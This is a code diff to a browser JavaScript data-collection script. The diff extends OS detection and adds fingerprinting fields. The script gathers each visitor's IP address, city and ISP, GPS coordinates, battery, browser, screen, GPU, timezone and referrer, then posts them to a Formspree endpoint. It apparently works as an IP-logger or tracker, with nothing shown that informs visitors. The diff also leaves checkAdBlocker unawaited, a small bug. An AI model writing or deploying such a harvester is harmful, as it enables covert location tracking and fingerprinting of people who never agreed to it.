@@ -9,13 +9,22 @@ function detectAndroidVersion() {
 
 function getOS() {
     const ua = navigator.userAgent;
+
     if (/Android/i.test(ua)) return "Android";
     if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
     if (/Windows Phone/i.test(ua)) return "Windows Phone";
+    if (/BlackBerry|BB10/i.test(ua)) return "BlackBerry";
+
     if (ua.includes("Windows NT")) return "Windows";
     if (ua.includes("Mac OS")) return "MacOS";
-    if (ua.includes("CrOS")) return "ChromeOS";
+    if (ua.includes("CrOS")) return "ChromeOS"; 
+    
     if (ua.includes("Linux")) return "Linux";
+    if (ua.includes("FreeBSD")) return "FreeBSD";
+    if (ua.includes("OpenBSD")) return "OpenBSD";
+    if (ua.includes("NetBSD")) return "NetBSD";
+    if (ua.includes("SunOS")) return "Solaris";
+
     return "Unknown OS";
 }
 
@@ -33,16 +42,14 @@ function getGPU() {
 
 async function getIPData() {
     try {
-        const response = await fetch("https://ipapi.co/json/");
-        const data = await response.json();
-        return {
-            ip: data.ip || "Unavailable",
-            country: data.country_name || "Unavailable",
-            city: data.city || "Unknown",
-            org: data.org || "Unavailable"
-        };
-    } catch (error) {
-        return { ip: "Blocked", country: "Error", city: "", org: "Error" };
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipJson = await ipRes.json();
+        const ip = ipJson.ip;
+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geoJson = await geoRes.json();
+        return { ip: ip, country: geoJson.country_name || "Unavailable", city: geoJson.city || "", org: geoJson.org || "Unavailable" };
+    } catch {
+        return { ip: "Unavailable", country: "Unavailable", city: "", org: "Unavailable" };
     }
 }
 
@@ -90,36 +97,38 @@ async function checkAdBlocker() {
 }
 
 async function collect() {
-    const [ipData, gps, battery, adBlockStatus] = await Promise.all([
-        getIPData(),
-        getGPS(),
-        getBatteryInfo(),
-        checkAdBlocker()
-    ]);
-
+    const ipData = await getIPData();
+    const gps = await getGPS();
+    const battery = await getBatteryInfo();
+    const adBlockStatus = checkAdBlocker();
     const currentOS = getOS();
+    const androidVer = detectAndroidVersion();
 
     return {
-        TIME: new Date().toLocaleString(),
+        TIME: new Date().toString(),
         IP: ipData.ip,
-        LOCATION: `${ipData.city}, ${ipData.country}`,
+        LOCATION: ipData.country + " " + ipData.city,
         ISP: ipData.org,
-        GPS_LAT: gps.lat,
-        GPS_LON: gps.lon,
-        BATTERY: battery,
+        GPS_LATITUDE: gps.lat,
+        GPS_LONGITUDE: gps.lon,
+        BATTERY_INFO: battery,
         AD_BLOCKER: adBlockStatus,
+        BROWSER: navigator.userAgent,
         OS: currentOS,
-        ANDROID_VER: detectAndroidVersion(),
-        SCREEN: `${window.screen.width}x${window.screen.height}`,
-        GPU: getGPU(),
+        Android_V: androidVer,
+        SCREEN: screen.width + "x" + screen.height,
+        TIMEZONE: Intl.DateTimeFormat().resolvedOptions().timeZone,
         LANGUAGE: navigator.language,
+        GPU: getGPU(),
+        PLATFORM: (currentOS === "Android") ? androidVer : navigator.platform,
+        TOUCH: navigator.maxTouchPoints > 0 ? "Yes" : "No",
         REFERRER: document.referrer || "Direct"
     };
 }
 
 async function sendData() {
     const data = await collect();
-    console.log("Data Collected:", data); // Helpful for debugging
+    console.log("Data Collected:", data); 
 
     try {
         const response = await fetch("https://formspree.io/f/maqpoaly", {
